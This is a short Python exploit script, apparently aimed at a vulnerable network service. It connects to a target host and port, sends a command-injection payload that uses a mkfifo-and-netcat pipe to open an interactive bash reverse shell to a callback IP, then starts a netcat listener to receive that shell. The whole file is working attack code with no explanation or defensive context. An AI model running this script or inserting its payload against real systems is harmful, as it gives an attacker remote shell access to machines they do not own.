#!/usr/bin/env python3

import socket
import subprocess
import sys

if len(sys.argv) != 5:
	print(f"Usage: {sys.argv[0]} [target_ip] [target_port] [callback_ip] [callback_port]")
	sys.exit()

rhost, rport, lhost, lport = sys.argv[1:]

print(f"[*] Connecting to {rhost}:{rport}")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	s.connect((rhost, int(rport)))
except:
	print(f"[-] Failed to connect to {rhost}:{rport}")
	sys.exit(1)
s.recv(100)

print(f"[*] Sending payload")
s.send(f"AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {lhost} {lport} >/tmp/f\n".encode())
s.close()
print(f"[+] Payload sent. Closing socket.")

print(f"[*] Opening listener. Callback should come within a minute.")
try:
	ncsh = subprocess.Popen(f"nc -nl {lhost} {lport}", shell=True)
	ncsh.poll()
	ncsh.wait()
except:
	print(f"\n[!] Exiting shell")

